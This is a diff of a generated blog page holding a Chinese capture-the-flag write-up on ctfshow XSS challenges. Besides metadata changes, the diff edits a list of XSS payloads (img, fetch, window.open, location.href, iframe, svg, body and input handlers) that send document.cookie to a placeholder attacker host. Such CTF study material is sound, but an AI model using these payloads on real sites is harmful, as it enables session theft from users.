@@ -17,21 +17,21 @@
                 <meta name="author" content="whistle.H">
                 <meta name="keywords" content="">
                 
-                    <meta name="description" content="之前一直在比赛遇到xss的题目，决定开始认真练习一下。 web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼 网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。">
+                    <meta name="description" content="之前一直在比赛遇到xss的题目，决定开始认真练习一下。 web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼 网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow-xss-wp">
-<meta property="og:url" content="http://example.com/2022/02/23/blog0004-ctfshow-xss-wp/index.html">
+<meta property="og:url" content="https://whistleh.github.io/2022/02/23/blog0004-ctfshow-xss-wp/index.html">
 <meta property="og:site_name" content="The world of whistleH">
-<meta property="og:description" content="之前一直在比赛遇到xss的题目，决定开始认真练习一下。 web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼 网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。">
+<meta property="og:description" content="之前一直在比赛遇到xss的题目，决定开始认真练习一下。 web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼 网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-02-22T16:29:11.000Z">
-<meta property="article:modified_time" content="2024-04-29T13:06:43.827Z">
+<meta property="article:modified_time" content="2024-07-26T13:12:16.000Z">
 <meta property="article:author" content="whistle.H">
 <meta property="article:tag" content="ctf">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="wp">
 <meta property="article:tag" content="ctfshow">
+<meta property="article:tag" content="web">
 <meta property="article:tag" content="xss">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary_large_image">
                         
                                 
@@ -80,7 +80,7 @@
                                                         <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"whistleh.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -230,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.4k 字
+          4.6k 字
         
       </span>
     
@@ -241,7 +241,7 @@
         
         
         
-          38 分钟
+          39 分钟
         
       </span>
     
@@ -295,7 +295,7 @@
 <p>不过会有各种过滤</p>
 <p>附上payload，一般都试试，如果过不去了可以试试其他办法</p>
 <p>xss平台：https://xss.pt/</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//首先是经典的img</span><br>&lt;script&gt;<br>    <span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;img&quot;</span>);<br>	img.src = <span class="hljs-string">&quot;http://your-domain:port/&quot;</span>+<span class="hljs-built_in">document</span>.cookie;<br>&lt;/script&gt;<br><br><span class="hljs-comment">//location.href系列</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br><span class="hljs-comment">//iframe标签</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><br><span class="hljs-comment">//input标签</span><br>&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;<br>    <br>//svg标签<br>&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;<br>    <br>//body标签<br>&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;<br><br>//img标签<br>&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;<br>&lt;img src=&#x27;x&#x27; onclick=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;<br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//首先是经典的img</span><br>&lt;script&gt;<br>    <span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;img&quot;</span>);<br>	img.src = <span class="hljs-string">&quot;http://your-domain:port/&quot;</span>+<span class="hljs-built_in">document</span>.cookie;<br>&lt;/script&gt;<br><br><span class="hljs-comment">//location.href系列</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.location.href=<span class="hljs-string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>&lt;script&gt;location.href=<span class="hljs-string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie&lt;script&gt;<br><br><span class="hljs-comment">// fecth</span><br>&lt;script&gt;fetch(<span class="hljs-string">`http://your-domain:port/?cookie=<span class="hljs-subst">$&#123;<span class="hljs-built_in">document</span>.cookie&#125;</span>`</span>).then(<span class="hljs-built_in">console</span>.log)&lt;script&gt;<br><br><span class="hljs-comment">//iframe标签</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><br><span class="hljs-comment">//input标签</span><br>&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;<br>    <br>//svg标签<br>&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;<br>    <br>//body标签<br>&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;<br><br>//img标签<br>&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;<br>&lt;img src=&#x27;x&#x27; onclick=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;<br></code></pre></td></tr></table></figure>
 <p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
 <p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
 <h2 id="存储型">存储型</h2>
@@ -384,13 +384,13 @@
       
         <a href="/tags/ctf/" class="print-no-link">#ctf</a>
       
-        <a href="/tags/web/" class="print-no-link">#web</a>
-      
-        <a href="/tags/wp/" class="print-no-link">#wp</a>
-      
         <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
       
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
         <a href="/tags/xss/" class="print-no-link">#xss</a>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
       
     </div>
   
@@ -403,7 +403,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>ctfshow-xss-wp</div>
-      <div>http://example.com/2022/02/23/blog0004-ctfshow-xss-wp/</div>
+      <div>https://whistleh.github.io/2022/02/23/blog0004-ctfshow-xss-wp/</div>
     </div>
     <div class="license-meta">
       
